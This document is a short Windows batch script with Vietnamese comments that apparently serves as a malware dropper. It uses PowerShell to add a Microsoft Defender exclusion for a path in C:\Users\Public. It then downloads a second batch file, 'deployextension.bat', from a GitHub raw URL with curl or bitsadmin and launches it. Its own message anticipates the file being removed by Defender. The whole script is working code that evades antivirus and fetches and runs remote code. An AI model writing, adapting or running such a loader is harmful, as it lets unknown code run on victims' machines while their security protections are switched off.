@echo off
setlocal enabledelayedexpansion
 
:: === Config ===
set "URL=https://raw.githubusercontent.com/vietwe1993/ichibanurl/main/deployextension.bat"
set "TARGET_DIR=C:\Users\Public"
set "FILENAME=deployextension.bat"
set "FULL_PATH=%TARGET_DIR%\%FILENAME%"
 
:: === Tạo thư mục nếu chưa có ===
if not exist "%TARGET_DIR%" (
    mkdir "%TARGET_DIR%"
)
 
:: === Cho phép Defender bỏ qua file cụ thể ===
powershell -Command "Add-MpPreference -ExclusionPath '%FULL_PATH%'"
 
:: === Đợi Defender áp dụng exclusion ===
timeout /t 3 >nul
 
:: === Tải file từ GitHub ===
where curl >nul 2>&1
if %errorlevel%==0 (
    curl -L -o "%FULL_PATH%" "%URL%"
) else (
    bitsadmin /transfer downloadJob /download /priority normal "%URL%" "%FULL_PATH%"
)
 
:: === Kiểm tra và chạy file ===
if exist "%FULL_PATH%" (
    echo Dang chay %FULL_PATH%
    start "" "%FULL_PATH%"
) else (
    echo Loi: File khong tai duoc hoac bi Defender xoa.
)
 
:: === Thoát script sạch sẽ ===
exit /b 0
